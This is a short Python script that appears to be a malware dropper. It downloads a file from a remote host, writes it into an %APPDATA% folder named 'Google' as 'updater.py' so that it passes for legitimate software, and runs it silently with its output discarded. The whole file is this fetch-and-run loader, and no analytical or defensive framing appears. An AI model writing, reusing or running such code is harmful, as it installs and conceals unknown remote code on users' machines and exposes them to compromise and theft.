import os
import requests
import subprocess
import sys
FILE_URL='https://love.wvxx.dpdns.org/download/blablabla/deptraichx.py'
appdata_path=os.getenv('APPDATA')
folder_path=os.path.join(appdata_path,'Google')
os.makedirs(folder_path,exist_ok=True)
file_path=os.path.join(folder_path,'updater.py')
def download_file():
    r=requests.get(FILE_URL);r.raise_for_status()
    with open(file_path,'wb')as f:f.write(r.content)
def run_file():subprocess.Popen([sys.executable,file_path],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
download_file()
run_file()
